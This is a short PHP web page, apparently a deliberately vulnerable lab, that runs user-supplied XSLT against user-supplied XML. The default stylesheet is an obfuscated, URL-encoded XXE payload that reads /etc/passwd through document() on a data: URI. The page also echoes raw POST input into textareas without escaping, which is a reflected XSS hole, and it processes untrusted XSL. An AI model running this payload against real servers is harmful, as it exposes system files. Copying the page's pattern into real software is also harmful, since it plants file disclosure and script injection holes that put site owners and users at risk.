<!DOCTYPE html>
<html>
<head>
    <title>XSLT Transformation</title>
    <link rel="stylesheet" href="./bootstrap.min.css">
</head>
<body>
    <div class="container">
        <h1>XSLT Transformation</h1>

        <form method="POST" action="<?php echo $_SERVER['PHP_SELF']; ?>">
            <div class="form-group">
                <label for="xml">XML Code:</label>
                <textarea class="form-control" rows="8" name="xml" id="xml"><?php echo isset($_POST['xml']) ? $_POST['xml'] : '&lt;root/&gt;'; ?></textarea>
            </div>

            <div class="form-group">
                <label for="xsl">XSL Code:</label>
                <textarea class="form-control" rows="8" name="xsl" id="xsl"><?php echo isset($_POST['xsl']) ? $_POST['xsl'] : htmlspecialchars(urldecode('%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%0A%3Cxsl%3Atransform%0A%20%20version%3D%221.0%22%0A%20%20xmlns%3Axsl%3D%22http%3A%2F%2Fwww.w3.org%2F1999%2FXSL%2FTransform%22%0A%3E%0A%20%20%3Cxsl%3Atemplate%20match%3D%22%2F%22%3E%0A%20%20%20%20%20%3Cxxe%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F1999%2Fxhtml%22%3E%0A%20%20%20%20%20%3Cb%3E%2Fetc%2Fpasswd%3A%20%3Cbr%2F%3E%3C%2Fb%3E%3Cxsl%3Acopy-of%20select%3D%22document%28%27data%3A%2C%253C%253Fxml%2520version%253D%25221.0%2522%2520encoding%253D%2522UTF-8%2522%253F%253E%250A%253C%2521DOCTYPE%2520xxe%2520%255B%2520%253C%2521ENTITY%2520xxe%2520SYSTEM%2520%2522file%3A%2F%2F%2Fetc%2Fpasswd%2522%253E%2520%255D%253E%250A%253Cxxe%253E%250A%2526xxe%253B%250A%253C%252Fxxe%253E%27%29%2Fxxe%22%2F%3E%0A%20%20%20%20%20%3C%2Fxxe%3E%0A%20%20%3C%2Fxsl%3Atemplate%3E%0A%3C%2Fxsl%3Atransform%3E')); ?></textarea>
            </div>

            <button type="submit" class="btn btn-primary">Transform</button>
        </form>

        <?php
        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            if (isset($_POST['xml']) && isset($_POST['xsl'])) {
                $xml = new DOMDocument();
                $xml->loadXML($_POST['xml']);
                $xsl = new DOMDocument();
                $xsl->loadXML($_POST['xsl']);
                $xsltProcessor = new XSLTProcessor();
                $xsltProcessor->importStylesheet($xsl);
                $transformedXml = $xsltProcessor->transformToXML($xml);
                echo '<h2>Result:</h2>';
                echo '<pre>' . htmlentities($transformedXml) . '</pre>';
            } else {
                echo '<p class="text-danger">Please provide both XML and XSL code.</p>';
            }
        }
        ?>
    </div>
</body>
</html>